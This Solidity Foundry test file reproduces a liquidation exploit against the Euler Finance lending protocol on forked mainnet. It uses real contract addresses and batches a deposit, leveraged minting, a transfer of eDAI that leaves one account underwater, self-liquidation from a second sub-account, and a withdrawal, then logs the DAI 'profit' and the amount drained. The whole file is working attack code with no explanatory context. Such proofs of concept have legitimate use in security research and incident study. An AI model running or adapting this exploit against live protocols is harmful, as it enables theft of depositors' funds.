pragma solidity 0.8.23;
import "forge-std/Test.sol";
interface I20 { function balanceOf(address) external view returns(uint256); function approve(address,uint256) external returns(bool); }
interface IEx { struct I { bool a; address p; bytes d; } function batchDispatch(I[] calldata,address[] calldata) external; }
interface IET { function balanceOf(address) external view returns(uint256); }
interface IDT { function balanceOf(address) external view returns(uint256); }

contract TestEulerTransferLiq is Test {
    address constant EU=0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EX=0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant M=0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant L=0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address constant DAI=0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant eD=0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address constant dD=0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;

    function testTransferAndLiquidate() public {
        deal(DAI, address(this), 30_000_000e18);
        I20(DAI).approve(EU, type(uint256).max);
        
        address sub1 = address(uint160(uint160(address(this)) ^ 1));
        uint256 daiBefore = I20(DAI).balanceOf(EU);
        
        // Batch: deposit + mint + transfer most eTokens to sub1 + liquidate sub0 + withdraw sub1
        IEx.I[] memory it = new IEx.I[](6);
        it[0] = IEx.I(false, M, abi.encodeWithSignature("enterMarket(uint256,address)",0,DAI));
        it[1] = IEx.I(false, eD, abi.encodeWithSignature("deposit(uint256,uint256)",0,20_000_000e18));
        it[2] = IEx.I(false, eD, abi.encodeWithSignature("mint(uint256,uint256)",0,180_000_000e18));
        // Transfer 150M eDAI to sub1 → sub0 goes underwater
        it[3] = IEx.I(false, eD, abi.encodeWithSignature("transfer(address,uint256)", sub1, 150_000_000e18));
        // Liquidate sub0 from sub1
        it[4] = IEx.I(false, L, abi.encodeWithSignature("liquidate(address,address,address,uint256,uint256)", address(this), DAI, DAI, type(uint256).max, 0));
        // Withdraw from sub1
        it[5] = IEx.I(false, eD, abi.encodeWithSignature("withdraw(uint256,uint256)", 1, type(uint256).max));
        
        address[] memory df = new address[](2);
        df[0] = address(this);
        df[1] = sub1;
        
        IEx(EX).batchDispatch(it, df);
        
        uint256 daiAfter = I20(DAI).balanceOf(address(this));
        uint256 daiEulerAfter = I20(DAI).balanceOf(EU);
        
        emit log_named_uint("DAI PROFIT", daiAfter);
        emit log_named_uint("DAI drained from Euler", daiBefore > daiEulerAfter ? daiBefore - daiEulerAfter : 0);
        emit log_named_uint("sub0 eDAI", IET(eD).balanceOf(address(this)));
        emit log_named_uint("sub0 dDAI", IDT(dD).balanceOf(address(this)));
        emit log_named_uint("sub1 eDAI", IET(eD).balanceOf(sub1));
        emit log_named_uint("sub1 dDAI", IDT(dD).balanceOf(sub1));
    }
    receive() external payable {}
}
